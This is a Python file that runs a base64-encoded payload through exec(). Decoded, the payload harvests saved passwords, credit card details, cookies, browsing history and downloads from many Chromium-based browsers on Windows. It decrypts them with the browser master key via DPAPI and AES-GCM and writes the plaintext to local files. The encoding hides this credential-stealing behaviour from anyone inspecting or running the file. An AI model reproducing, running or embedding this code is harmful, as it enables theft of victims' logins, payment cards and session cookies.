import base64

exec(base64.b64decode("aW1wb3J0IGJhc2U2NA0KaW1wb3J0IGpzb24NCmltcG9ydCBvcw0KaW1wb3J0IHNodXRpbA0KaW1wb3J0IHNxbGl0ZTMNCmZyb20gZGF0ZXRpbWUgaW1wb3J0IGRhdGV0aW1lLCB0aW1lZGVsdGENCg0KZnJvbSBDcnlwdG9kb21lLkNpcGhlciBpbXBvcnQgQUVTDQpmcm9tIHdpbjMyY3J5cHQgaW1wb3J0IENyeXB0VW5wcm90ZWN0RGF0YQ0KDQphcHBkYXRhID0gb3MuZ2V0ZW52KCdMT0NBTEFQUERBVEEnKQ0KDQpicm93c2VycyA9IHsNCiAgICAnYXZhc3QnOiBhcHBkYXRhICsgJ1xcQVZBU1QgU29mdHdhcmVcXEJyb3dzZXJcXFVzZXIgRGF0YScsDQogICAgJ2FtaWdvJzogYXBwZGF0YSArICdcXEFtaWdvXFxVc2VyIERhdGEnLA0KICAgICd0b3JjaCc6IGFwcGRhdGEgKyAnXFxUb3JjaFxcVXNlciBEYXRhJywNCiAgICAna29tZXRhJzogYXBwZGF0YSArICdcXEtvbWV0YVxcVXNlciBEYXRhJywNCiAgICAnb3JiaXR1bSc6IGFwcGRhdGEgKyAnXFxPcmJpdHVtXFxVc2VyIERhdGEnLA0KICAgICdjZW50LWJyb3dzZXInOiBhcHBkYXRhICsgJ1xcQ2VudEJyb3dzZXJcXFVzZXIgRGF0YScsDQogICAgJzdzdGFyJzogYXBwZGF0YSArICdcXDdTdGFyXFw3U3RhclxcVXNlciBEYXRhJywNCiAgICAnc3B1dG5payc6IGFwcGRhdGEgKyAnXFxTcHV0bmlrXFxTcHV0bmlrXFxVc2VyIERhdGEnLA0KICAgICd2aXZhbGRpJzogYXBwZGF0YSArICdcXFZpdmFsZGlcXFVzZXIgRGF0YScsDQogICAgJ2dvb2dsZS1jaHJvbWUtc3hzJzogYXBwZGF0YSArICdcXEdvb2dsZVxcQ2hyb21lIFN4U1xcVXNlciBEYXRhJywNCiAgICAnZ29vZ2xlLWNocm9tZSc6IGFwcGRhdGEgKyAnXFxHb29nbGVcXENocm9tZVxcVXNlciBEYXRhJywNCiAgICAnZXBpYy1wcml2YWN5LWJyb3dzZXInOiBhcHBkYXRhICsgJ1xcRXBpYyBQcml2YWN5IEJyb3dzZXJcXFVzZXIgRGF0YScsDQogICAgJ21pY3Jvc29mdC1lZGdlJzogYXBwZGF0YSArICdcXE1pY3Jvc29mdFxcRWRnZVxcVXNlciBEYXRhJywNCiAgICAndXJhbic6IGFwcGRhdGEgKyAnXFx1Q296TWVkaWFcXFVyYW5cXFVzZXIgRGF0YScsDQogICAgJ3lhbmRleCc6IGFwcGRhdGEgKyAnXFxZYW5kZXhcXFlhbmRleEJyb3dzZXJcXFVzZXIgRGF0YScsDQogICAgJ2JyYXZlJzogYXBwZGF0YSArICdcXEJyYXZlU29mdHdhcmVcXEJyYXZlLUJyb3dzZXJcXFVzZXIgRGF0YScsDQogICAgJ2lyaWRpdW0nOiBhcHBkYXRhICsgJ1xcSXJpZGl1bVxcVXNlciBEYXRhJywNCn0NCg0KZGF0YV9xdWVyaWVzID0gew0KICAgICdsb2dpbl9kYXRhJzogew0KICAgICAgICAncXVlcnknOiAnU0VMRUNUIGFjdGlvbl91cmwsIHVzZXJuYW1lX3ZhbHVlLCBwYXNzd29yZF92YWx1ZSBGUk9NIGxvZ2lucycsDQogICAgICAgICdmaWxlJzogJ1xcTG9naW4gRGF0YScsDQogICAgICAgICdjb2x1bW5zJzogWydVUkwnLCAnRW1haWwnLCAnUGFzc3dvcmQnXSwNCiAgICAgICAgJ2RlY3J5cHQnOiBUcnVlDQogICAgfSwNCiAgICAnY3JlZGl0X2NhcmRzJzogew0KICAgICAgICAncXVlcnknOiAnU0VMRUNUIG5hbWVfb25fY2FyZCwgZXhwaXJhdGlvbl9tb250aCwgZXhwaXJhdGlvbl95ZWFyLCBjYXJkX251bWJlcl9lbmNyeXB0ZWQsIGRhdGVfbW9kaWZpZWQgRlJPTSBjcmVkaXRfY2FyZHMnLA0KICAgICAgICAnZmlsZSc6ICdcXFdlYiBEYXRhJywNCiAgICAgICAgJ2NvbHVtbnMnOiBbJ05hbWUgT24gQ2FyZCcsICdDYXJkIE51bWJlcicsICdFeHBpcmVzIE9uJywgJ0FkZGVkIE9uJ10sDQogICAgICAgICdkZWNyeXB0JzogVHJ1ZQ0KICAgIH0sDQogICAgJ2Nvb2tpZXMnOiB7DQogICAgICAgICdxdWVyeSc6ICdTRUxFQ1QgaG9zdF9rZXksIG5hbWUsIHBhdGgsIGVuY3J5cHRlZF92YWx1ZSwgZXhwaXJlc191dGMgRlJPTSBjb29raWVzJywNCiAgICAgICAgJ2ZpbGUnOiAnXFxOZXR3b3JrXFxDb29raWVzJywNCiAgICAgICAgJ2NvbHVtbnMnOiBbJ0hvc3QgS2V5JywgJ0Nvb2tpZSBOYW1lJywgJ1BhdGgnLCAnQ29va2llJywgJ0V4cGlyZXMgT24nXSwNCiAgICAgICAgJ2RlY3J5cHQnOiBUcnVlDQogICAgfSwNCiAgICAnaGlzdG9yeSc6IHsNCiAgICAgICAgJ3F1ZXJ5JzogJ1NFTEVDVCB1cmwsIHRpdGxlLCBsYXN0X3Zpc2l0X3RpbWUgRlJPTSB1cmxzJywNCiAgICAgICAgJ2ZpbGUnOiAnXFxIaXN0b3J5JywNCiAgICAgICAgJ2NvbHVtbnMnOiBbJ1VSTCcsICdUaXRsZScsICdWaXNpdGVkIFRpbWUnXSwNCiAgICAgICAgJ2RlY3J5cHQnOiBGYWxzZQ0KICAgIH0sDQogICAgJ2Rvd25sb2Fkcyc6IHsNCiAgICAgICAgJ3F1ZXJ5JzogJ1NFTEVDVCB0YWJfdXJsLCB0YXJnZXRfcGF0aCBGUk9NIGRvd25sb2FkcycsDQogICAgICAgICdmaWxlJzogJ1xcSGlzdG9yeScsDQogICAgICAgICdjb2x1bW5zJzogWydEb3dubG9hZCBVUkwnLCAnTG9jYWwgUGF0aCddLA0KICAgICAgICAnZGVjcnlwdCc6IEZhbHNlDQogICAgfQ0KfQ0KDQoNCmRlZiBnZXRfbWFzdGVyX2tleShwYXRoOiBzdHIpOg0KICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhwYXRoKToNCiAgICAgICAgcmV0dXJuDQoNCiAgICBpZiAnb3NfY3J5cHQnIG5vdCBpbiBvcGVuKHBhdGggKyAiXFxMb2NhbCBTdGF0ZSIsICdyJywgZW5jb2Rpbmc9J3V0Zi04JykucmVhZCgpOg0KICAgICAgICByZXR1cm4NCg0KICAgIHdpdGggb3BlbihwYXRoICsgIlxcTG9jYWwgU3RhdGUiLCAiciIsIGVuY29kaW5nPSJ1dGYtOCIpIGFzIGY6DQogICAgICAgIGMgPSBmLnJlYWQoKQ0KICAgIGxvY2FsX3N0YXRlID0ganNvbi5sb2FkcyhjKQ0KDQogICAga2V5ID0gYmFzZTY0LmI2NGRlY29kZShsb2NhbF9zdGF0ZVsib3NfY3J5cHQiXVsiZW5jcnlwdGVkX2tleSJdKQ0KICAgIGtleSA9IGtleVs1Ol0NCiAgICBrZXkgPSBDcnlwdFVucHJvdGVjdERhdGEoa2V5LCBOb25lLCBOb25lLCBOb25lLCAwKVsxXQ0KICAgIHJldHVybiBrZXkNCg0KDQpkZWYgZGVjcnlwdF9wYXNzd29yZChidWZmOiBieXRlcywga2V5OiBieXRlcykgLT4gc3RyOg0KICAgIGl2ID0gYnVmZlszOjE1XQ0KICAgIHBheWxvYWQgPSBidWZmWzE1Ol0NCiAgICBjaXBoZXIgPSBBRVMubmV3KGtleSwgQUVTLk1PREVfR0NNLCBpdikNCiAgICBkZWNyeXB0ZWRfcGFzcyA9IGNpcGhlci5kZWNyeXB0KHBheWxvYWQpDQogICAgZGVjcnlwdGVkX3Bhc3MgPSBkZWNyeXB0ZWRfcGFzc1s6LTE2XS5kZWNvZGUoKQ0KDQogICAgcmV0dXJuIGRlY3J5cHRlZF9wYXNzDQoNCg0KZGVmIHNhdmVfcmVzdWx0cyhicm93c2VyX25hbWUsIHR5cGVfb2ZfZGF0YSwgY29udGVudCk6DQogICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKGJyb3dzZXJfbmFtZSk6DQogICAgICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cygiYnJvd3NlcnMiKToNCiAgICAgICAgICAgIG9zLm1rZGlyKCJicm93c2VycyIpDQogICAgICAgIA0KICAgICAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMoImJyb3dzZXJzLyIgKyBicm93c2VyX25hbWUpOg0KICAgICAgICAgICAgb3MubWtkaXIoImJyb3dzZXJzLyIgKyBicm93c2VyX25hbWUpDQogICAgaWYgY29udGVudCBpcyBub3QgTm9uZToNCiAgICAgICAgb3BlbihmJ2Jyb3dzZXJzL3ticm93c2VyX25hbWV9L3t0eXBlX29mX2RhdGF9LnR4dCcsICd3JywgZW5jb2Rpbmc9InV0Zi04Iikud3JpdGUoY29udGVudCkNCiAgICAgICAgcHJpbnQoZiJcdCBbKl0gU2F2ZWQgaW4ge2Jyb3dzZXJfbmFtZX0ve3R5cGVfb2ZfZGF0YX0udHh0IikNCiAgICBlbHNlOg0KICAgICAgICBwcmludChmIlx0IFstXSBObyBEYXRhIEZvdW5kISIpDQoNCg0KZGVmIGdldF9kYXRhKHBhdGg6IHN0ciwgcHJvZmlsZTogc3RyLCBrZXksIHR5cGVfb2ZfZGF0YSk6DQogICAgZGJfZmlsZSA9IGYne3BhdGh9XFx7cHJvZmlsZX17dHlwZV9vZl9kYXRhWyJmaWxlIl19Jw0KICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhkYl9maWxlKToNCiAgICAgICAgcmV0dXJuDQogICAgcmVzdWx0ID0gIiINCiAgICBzaHV0aWwuY29weShkYl9maWxlLCAndGVtcF9kYicpDQogICAgY29ubiA9IHNxbGl0ZTMuY29ubmVjdCgndGVtcF9kYicpDQogICAgY3Vyc29yID0gY29ubi5jdXJzb3IoKQ0KICAgIGN1cnNvci5leGVjdXRlKHR5cGVfb2ZfZGF0YVsncXVlcnknXSkNCiAgICBmb3Igcm93IGluIGN1cnNvci5mZXRjaGFsbCgpOg0KICAgICAgICByb3cgPSBsaXN0KHJvdykNCiAgICAgICAgaWYgdHlwZV9vZl9kYXRhWydkZWNyeXB0J106DQogICAgICAgICAgICBmb3IgaSBpbiByYW5nZShsZW4ocm93KSk6DQogICAgICAgICAgICAgICAgaWYgaXNpbnN0YW5jZShyb3dbaV0sIGJ5dGVzKToNCiAgICAgICAgICAgICAgICAgICAgcm93W2ldID0gZGVjcnlwdF9wYXNzd29yZChyb3dbaV0sIGtleSkNCiAgICAgICAgaWYgZGF0YV90eXBlX25hbWUgPT0gJ2hpc3RvcnknOg0KICAgICAgICAgICAgaWYgcm93WzJdICE9IDA6DQogICAgICAgICAgICAgICAgcm93WzJdID0gY29udmVydF9jaHJvbWVfdGltZShyb3dbMl0pDQogICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgIHJvd1syXSA9ICIwIg0KICAgICAgICByZXN1bHQgKz0gIlxuIi5qb2luKFtmIntjb2x9OiB7dmFsfSIgZm9yIGNvbCwgdmFsIGluIHppcCh0eXBlX29mX2RhdGFbJ2NvbHVtbnMnXSwgcm93KV0pICsgIlxuXG4iDQogICAgY29ubi5jbG9zZSgpDQogICAgb3MucmVtb3ZlKCd0ZW1wX2RiJykNCiAgICByZXR1cm4gcmVzdWx0DQoNCg0KZGVmIGNvbnZlcnRfY2hyb21lX3RpbWUoY2hyb21lX3RpbWUpOg0KICAgIHJldHVybiAoZGF0ZXRpbWUoMTYwMSwgMSwgMSkgKyB0aW1lZGVsdGEobWljcm9zZWNvbmRzPWNocm9tZV90aW1lKSkuc3RyZnRpbWUoJyVkLyVtLyVZICVIOiVNOiVTJykNCg0KDQpkZWYgaW5zdGFsbGVkX2Jyb3dzZXJzKCk6DQogICAgYXZhaWxhYmxlID0gW10NCiAgICBmb3IgeCBpbiBicm93c2Vycy5rZXlzKCk6DQogICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKGJyb3dzZXJzW3hdKToNCiAgICAgICAgICAgIGF2YWlsYWJsZS5hcHBlbmQoeCkNCiAgICByZXR1cm4gYXZhaWxhYmxlDQoNCg0KDQphdmFpbGFibGVfYnJvd3NlcnMgPSBpbnN0YWxsZWRfYnJvd3NlcnMoKQ0KDQpmb3IgYnJvd3NlciBpbiBhdmFpbGFibGVfYnJvd3NlcnM6DQogICAgYnJvd3Nlcl9wYXRoID0gYnJvd3NlcnNbYnJvd3Nlcl0NCiAgICBtYXN0ZXJfa2V5ID0gZ2V0X21hc3Rlcl9rZXkoYnJvd3Nlcl9wYXRoKQ0KICAgIHByaW50KGYiR2V0dGluZyBTdG9yZWQgRGV0YWlscyBmcm9tIHticm93c2VyfSIpDQoNCiAgICBmb3IgZGF0YV90eXBlX25hbWUsIGRhdGFfdHlwZSBpbiBkYXRhX3F1ZXJpZXMuaXRlbXMoKToNCiAgICAgICAgcHJpbnQoZiJcdCBbIV0gR2V0dGluZyB7ZGF0YV90eXBlX25hbWUucmVwbGFjZSgnXycsICcgJykuY2FwaXRhbGl6ZSgpfSIpDQogICAgICAgIGRhdGEgPSBnZXRfZGF0YShicm93c2VyX3BhdGgsICJEZWZhdWx0IiwgbWFzdGVyX2tleSwgZGF0YV90eXBlKQ0KICAgICAgICBzYXZlX3Jlc3VsdHMoYnJvd3NlciwgZGF0YV90eXBlX25hbWUsIGRhdGEpDQogICAgICAgIHByaW50KCJcdC0tLS0tLVxuIikNCg0K"))